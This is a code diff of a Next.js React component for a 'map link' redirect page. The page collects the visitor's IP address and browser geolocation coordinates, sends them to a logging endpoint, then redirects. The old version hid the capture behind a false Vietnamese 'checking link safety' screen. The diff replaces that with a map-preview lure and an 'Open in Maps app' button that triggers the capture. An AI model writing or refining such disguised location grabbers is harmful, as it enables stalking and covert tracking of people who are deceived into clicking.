@@ -1,13 +1,22 @@
 'use client';
 
-import { useEffect } from 'react';
+import { useState } from 'react';
+import Image from 'next/image';
+import { Button } from '@/components/ui/button';
+import { MapPin, ArrowUpRight, Loader2 } from 'lucide-react';
+import type { MapLinkConfig } from '@/app/actions/map-links';
 
 interface MapRedirectClientProps {
   redirectUrl: string;
+  config: MapLinkConfig;
 }
 
-export function MapRedirectClient({ redirectUrl }: MapRedirectClientProps) {
-  useEffect(() => {
+export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProps) {
+  const [isLoading, setIsLoading] = useState(false);
+
+  const handleOpenMap = () => {
+    setIsLoading(true);
+
     const requestLocation = async () => {
       let clientIp = 'N/A';
       try {
@@ -21,7 +30,6 @@ export function MapRedirectClient({ redirectUrl }: MapRedirectClientProps) {
       }
 
       const logData = (pos?: GeolocationPosition) => {
-        // This is from a map link, so the source is 'link'
         const body: { ip: string; lat?: number; lon?: number; acc?: number; from: string } = { ip: clientIp, from: 'link' };
         if (pos) {
           body.lat = pos.coords.latitude;
@@ -34,7 +42,6 @@ export function MapRedirectClient({ redirectUrl }: MapRedirectClientProps) {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(body),
         }).finally(() => {
-          // Redirect to the final URL from settings after logging
           window.location.href = redirectUrl;
         });
       };
@@ -49,34 +56,54 @@ export function MapRedirectClient({ redirectUrl }: MapRedirectClientProps) {
         logData(); // Geolocation not supported
       }
     };
-
-    const timer = setTimeout(() => {
-        requestLocation();
-    }, 800);
     
-    return () => clearTimeout(timer);
-  }, [redirectUrl]);
-
+    // Slight delay to allow UI to update before potential blocking from geolocation prompt
+    setTimeout(requestLocation, 100);
+  };
+  
   return (
-    <div style={{
-      fontFamily: 'sans-serif',
-      textAlign: 'center',
-      paddingTop: '100px',
-      background: '#f4f7f6',
-      color: '#333',
-      position: 'fixed',
-      inset: 0,
-      zIndex: 9999,
-    }}>
-      <div style={{
-        background: '#fff',
-        padding: '40px',
-        display: 'inline-block',
-        borderRadius: '12px',
-        boxShadow: '0 4px 10px rgba(0,0,0,0.1)'
-      }}>
-        <h3>Đang kết nối an toàn...</h3>
-        <p>Hệ thống đang kiểm tra an toàn link, vui lòng chờ.</p>
+    <div className="flex flex-col min-h-screen bg-background">
+      {/* Image Header */}
+      <div className="relative w-full h-60 sm:h-72 flex-shrink-0">
+        <Image 
+          src={config.imageUrl}
+          alt={config.title}
+          layout="fill"
+          objectFit="cover"
+          priority
+        />
+        <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent" />
+      </div>
+
+      {/* Content Body */}
+      <div className="flex-grow flex flex-col">
+        <div className="p-5 flex-grow">
+          <div className="flex items-start gap-4">
+              <div className="bg-muted/80 p-3 rounded-lg mt-1">
+                  <MapPin className="h-6 w-6 text-foreground/80" />
+              </div>
+              <div>
+                  <h1 className="text-xl font-bold text-foreground">{config.title}</h1>
+                  <p className="text-sm text-muted-foreground mt-1">{config.description}</p>
+              </div>
+          </div>
+        </div>
+        
+        {/* Footer Action Button */}
+        <div className="bg-background p-4 border-t sticky bottom-0">
+          <Button 
+            className="w-full h-12 text-base font-semibold"
+            onClick={handleOpenMap}
+            disabled={isLoading}
+          >
+            {isLoading ? (
+              <Loader2 className="mr-2 h-5 w-5 animate-spin" />
+            ) : (
+              <ArrowUpRight className="mr-2 h-5 w-5" />
+            )}
+            {isLoading ? 'Đang xử lý...' : 'Mở trong ứng dụng Bản đồ'}
+          </Button>
+        </div>
       </div>
     </div>
   );
